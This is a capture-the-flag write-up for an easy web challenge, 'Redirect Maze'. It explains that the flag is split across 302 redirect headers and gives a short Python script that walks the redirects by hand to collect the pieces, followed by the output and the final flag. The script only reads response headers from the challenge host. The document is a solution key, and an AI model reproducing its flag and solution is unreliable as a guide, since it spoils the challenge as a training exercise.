## **Challenge Overview**

**Name:**  Redirect Maze
**Category:** Web  
**Difficulty:** Easy
**Points**: 100
###### Challenge Description

**Warpgate** by CTF7 Labs is an HTTP redirect research platform. Enter the maze and you will be bounced through a series of hops before landing at the finish line. The secret is split across the journey, but your browser follows redirects silently and only shows you the final destination.

---

## **Application Behavior Analysis**

- Endpoint pattern:

```
/maze/1 → /maze/2 → /maze/3 → ... → /maze/n
```

- Each response:
    - Returns a **302 Redirect**
    - Contains:
        - `Location` header → next hop
        - `X-Flag-Part` header → fragment of the flag


#### Exploit Requeat
```python
import requests

base = "http://chall-0c11ee06.evt-246.glabs.ctf7.com"
url = base + "/maze/1"

flag = ""

while True:
    r = requests.get(url, allow_redirects=False)

    # Extract flag part
    if 'X-Flag-Part' in r.headers:
        part = r.headers['X-Flag-Part']
        print(f"[+] {url} -> {part}")
        flag += part

    # Follow redirect
    if 'Location' in r.headers:
        url = base + r.headers['Location']
    else:
        break

print("\n FLAG:", flag)
```


Response
```
python3 exploit.py 
[+] http://chall-0c11ee06.evt-246.glabs.ctf7.com/maze/1 -> 1:ctf7{l
[+] http://chall-0c11ee06.evt-246.glabs.ctf7.com/maze/2 -> 2:ost_in
[+] http://chall-0c11ee06.evt-246.glabs.ctf7.com/maze/3 -> 3:_redir
[+] http://chall-0c11ee06.evt-246.glabs.ctf7.com/maze/4 -> 4:ects_d
[+] http://chall-0c11ee06.evt-246.glabs.ctf7.com/maze/5 -> 5:533ad84}

FLAG: 1:ctf7{l2:ost_in3:_redir4:ects_d5:533ad84}
```

Flag:
```
ctf7{lost_in_redirects_d533ad84}
```

---

